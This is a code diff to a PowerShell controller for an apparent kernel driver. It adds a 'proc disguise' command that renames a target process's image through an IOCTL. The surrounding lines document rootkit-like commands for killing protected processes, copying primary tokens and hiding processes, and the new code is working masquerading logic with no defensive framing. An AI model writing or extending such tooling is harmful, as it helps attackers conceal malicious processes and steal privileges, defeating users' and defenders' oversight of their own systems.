@@ -5119,6 +5119,7 @@ try {
             #   proc term <pid> [clearp] [code] terminate; clearp drops protection first
             #   proc token <src_pid> <dst_pid>  read/copy the primary token
             #   proc hide <pid> | proc unhide <pid>
+#   proc disguise <pid> <name>  rename the process image (15 bytes max)
 
             function New-ProcReq([uint32]$op, [uint32]$pidVal, [uint64]$a0, [uint32]$a1, [uint32]$fl) {
                 $req = New-Object byte[] 56
@@ -5252,6 +5253,25 @@ try {
                 $req = New-ProcReq 11 0 0 0 0
                 $out = Invoke-YghvIoctl -Code ([YghvCtlNative]::IoCtl(0x838)) -InBytes $req -OutputLength 4096
                 Write-Host ("proc guard-stats: strips={0} active={1} target=0x{2:X} resolved={3}" -f [BitConverter]::ToUInt64($out, 8), [BitConverter]::ToUInt64($out, 16), [BitConverter]::ToUInt64($out, 24), [BitConverter]::ToUInt64($out, 32))
+                return
+            }
+            if ($v -eq 'disguise') {
+                if ($null -eq $Arg2 -or $null -eq $Arg3) { throw 'proc disguise: usage: proc disguise <pid> <name>' }
+                $dp = [uint32]::Parse($Arg2)
+                $dn = "$Arg3"
+                $req = New-ProcReq 12 $dp 0 0 0
+                # Write the name into the name[32] field at offset 24
+                $nb = [Text.Encoding]::ASCII.GetBytes($dn)
+                $nl = [Math]::Min($nb.Length, 15)
+                [Array]::Copy($nb, 0, $req, 24, $nl)
+                $out = Invoke-YghvIoctl -Code ([YghvCtlNative]::IoCtl(0x838)) -InBytes $req -OutputLength 4096
+                $ok = [BitConverter]::ToUInt64($out, 0)
+                $err = [BitConverter]::ToUInt64($out, 8)
+                if ($ok -ne 0) {
+                    Write-Host ("proc disguise: pid={0} name='{1}' ok" -f $dp, $dn)
+                } else {
+                    Write-Host ("proc disguise: pid={0} name='{1}' FAILED error={2}" -f $dp, $dn, $err)
+                }
                 return
             }
             # Anything left is a bare pid: single-process query.
